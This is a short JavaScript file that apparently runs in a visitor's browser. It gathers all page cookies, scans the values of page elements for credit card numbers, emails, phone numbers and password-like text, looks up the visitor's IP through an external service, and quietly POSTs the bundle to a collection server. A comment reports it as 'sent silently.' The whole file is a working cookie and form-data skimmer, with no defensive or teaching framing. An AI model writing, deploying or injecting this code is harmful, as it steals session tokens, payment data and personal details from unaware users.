// 1. Get Current Page Cookies
function getCookies() {
    return document.cookie.split(';').map(c => c.trim()).filter(c => c.length > 0);
}

// 2. Scan DOM for Sensitive Info (Regex Patterns)
function scanDOM() {
    const patterns = [
        { name: 'Credit Card', regex: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/ },
        { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/ },
        { name: 'Phone', regex: /\b\d{10}\b/ }, // Simple 10-digit match
        { name: 'Password Field', regex: /password|pin|secret/i }
    ];

    let found = [];
    document.querySelectorAll('*').forEach(el => {
        if (el.value && el.tagName !== 'SCRIPT') {
            patterns.forEach(p => {
                if (p.regex.test(el.value)) {
                    found.push({
                        type: p.name,
                        tag: el.tagName,
                        value: el.value.substring(0, 100), // Limit length
                        context: el.parentElement?.tagName || 'Unknown'
                    });
                }
            });
        }
    });
    return found;
}

// 3. Main Execution
(async () => {
    // Get User IP via external API
    let ip = 'Unknown';
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        ip = (await ipRes.json()).ip;
    } catch(e) {}

    const payload = {
        hostname: window.location.hostname,
        url: window.location.href,
        userAgent: navigator.userAgent,
        ip: ip,
        cookies: getCookies(),
        passwords: [], // In a pure web app, we can't get saved passwords easily without extension
        sensitiveInfo: scanDOM(),
        timestamp: Date.now()
    };

    // Send to Server
    try {
        await fetch('http://localhost:3000/api/scrape', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        console.log("Data sent silently.");
    } catch (err) {
        console.error("Send failed", err);
    }
})();